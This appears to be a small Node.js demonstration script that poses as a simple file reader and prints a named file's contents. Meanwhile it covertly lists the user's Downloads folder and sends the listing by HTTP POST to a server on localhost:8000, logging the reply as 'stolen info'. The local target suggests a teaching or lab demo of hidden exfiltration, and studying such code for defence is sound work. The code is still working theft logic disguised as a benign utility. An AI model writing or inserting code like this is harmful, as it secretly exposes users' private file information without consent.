const readDir = require("fs").readdir;
const readFile = require("fs").readFile;
const homedir = require("os").homedir;
const request = require("request");

const filename = process.argv[2];

async function sendDataOverHTTP(data) {
    return request.post("http://localhost:8000/", {
        body: data,
    }, (err, resp, body) => {
        console.log("=============================")
        console.log("= stolen info =")
        console.log(body);
        console.log("=============================")
    })
}

async function gatherFileInfo() {
    const dirName = homedir() + "\\Downloads";
    return readDir(dirName, async (err, cnt) => {
        if (err) {
            console.error(err);
            return;
        }

        return await sendDataOverHTTP(cnt.toString());
    });
}

readFile(filename, async (err, cnt) => {
    if(err) {
        console.error(err);
        exit(1);
    }
    await gatherFileInfo();
    console.log("===YOUR EXPECTING INFORMATION===");
    console.log(cnt.toString());
    console.log("================================");
})

console.log(homedir() + "\\Downloads");